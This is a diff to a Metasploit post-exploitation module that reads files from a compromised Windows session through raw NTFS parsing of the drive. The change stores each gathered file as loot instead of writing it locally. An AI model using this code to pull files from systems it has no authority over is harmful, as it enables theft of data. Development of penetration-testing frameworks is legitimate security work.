@@ -54,16 +54,13 @@ class Metasploit3 < Msf::Post
     end
     @handle = r['return']
     print_status("Successfuly opened #{drive}")
-
     begin
       fs = Rex::Parser::NTFS.new(self)
-
+      print_status("Trying gather #{file}")
       data = fs.file(file[3, file.length - 3])
       file_name = file.split("\\")[-1]
-      print_status("Saving file #{file_name}")
-      file_result = ::File.new(file_name, "w")
-      file_result.syswrite(data)
-      file_result.close
+      stored_path = store_loot("windows.file", 'application/octet-stream', session, data, file_name, "Windows file")
+      print_status("Saving file : #{stored_path}")
     rescue ::Exception => e
       print_error("Post failed : #{e.backtrace}")
     ensure
